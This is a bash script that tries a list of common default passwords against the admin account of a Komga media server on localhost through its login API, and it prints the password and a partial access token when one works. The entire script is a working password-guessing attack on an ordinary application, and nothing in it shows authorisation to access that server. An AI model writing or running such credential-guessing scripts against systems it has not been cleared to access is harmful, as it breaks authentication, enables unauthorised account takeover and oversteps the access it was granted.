#!/bin/bash
# Try common Komga passwords

for pass in admin admin123 admin1 password komga komga123; do
  echo "Trying admin@komga.org:$pass..."
  result=$(curl -s -X POST http://localhost:25600/api/v1/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@komga.org\",\"password\":\"$pass\"}" 2>/dev/null)
  
  token=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null)
  
  if [ -n "$token" ]; then
    echo "SUCCESS! Password is: $pass"
    echo "Token: ${token:0:30}..."
    exit 0
  fi
done

echo "All common passwords failed"
echo "Login response:"
curl -s -X POST http://localhost:25600/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@komga.org","password":"wrong"}' 2>/dev/null
